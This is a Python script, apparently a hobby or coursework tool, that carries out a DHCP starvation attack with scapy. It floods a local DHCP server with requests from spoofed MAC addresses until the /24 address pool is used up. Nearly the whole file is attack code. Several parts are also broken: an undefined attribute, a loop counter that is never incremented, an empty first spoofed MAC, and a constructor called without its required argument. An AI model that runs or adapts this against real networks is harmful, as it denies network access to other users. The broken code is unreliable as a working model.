from oldstuff.main import IPV4_BROADCAST, MAC_BROADCAST
from scapy.all import *
import threading
import argparse
from time import sleep
import logging


MAX_IPS = 255
IPV4_NETWORK = "0.0.0.0"

LOGGER = logging.getLogger()
LOG_HANDLER = logging.StreamHandler()
LOGGER.addHandler(LOG_HANDLER)

LOG_HANDLER.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
# LOGGER.error("ABCD")

class DHCPStarvation():
    '''
    Implements basic DHCP starvation functionality. Will attempt to occupy /24 address space.
    '''
    def __init__(self, dhcp_ip: str, threads: int = 1, maximum_tries: int = 3):
        self.starved_macs = set()
        self.starved_ips = set()
        self.own_ip = get_if_addr(conf.iface)
        self.maximum_tries = maximum_tries
        self.dhcp_ip = dhcp_ip

        thrd = threading.Thread(target=self.sniffer)
        thrd.start()
        timeout = 0

        LOGGER.info("Starting DHCP starvation")

        while len(self.starved_ips) < self.maximum_ips and timeout < self.maximum_tries:
            self.starve()


    def packet_callback(self, in_packet):
        if in_packet[DHCP]:
            if in_packet[DHCP].options[0][1] == 5 and in_packet[IP].dst != self.own_ip:
                self.starved_ips.add(in_packet[IP].dst)
                LOGGER.info(f"{in_packet[IP].dst} registered")
            elif in_packet[DHCP].options[0][1] == 6:
                LOGGER.info("DHCP NACK received!")


    def sniffer(self):
        sniff(filter = "udp and (port 67 or port 68)", prn=self.packet_callback, store=0)


    def starve(self):
        ip_prefix = '.'.join(self.own_ip.split(".")[:-1])
        for ip_suffix in range(MAX_IPS):
            ip = f"{ip_prefix}.{ip_suffix}"

            if ip == self.own_ip:
                continue

            if ip in self.starved_ips:
                continue

            spoofed_mac = ""
            while spoofed_mac in self.starved_macs:
                spoofed_mac = RandMAC()
            self.starved_macs.add(spoofed_mac)

            dhcp_pkt = Ether(src=spoofed_mac, dst=MAC_BROADCAST)
            dhcp_pkt /= IP(src=IPV4_NETWORK, dst=IPV4_BROADCAST)
            dhcp_pkt /= UDP(sport=68, dport=67)
            dhcp_pkt /= BOOTP(chaddr=RandString(12, "0123456789abcdef"))
            dhcp_pkt /= DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", ip),
                ("server_id", self.dhcp_ip),
                "end"
            ])

            sendp(dhcp_pkt)
            logging.info(f"Attempting to occupy {ip}")
            sleep(0.2)
            
        



if __name__ == '__main__':
    d = DHCPStarvation()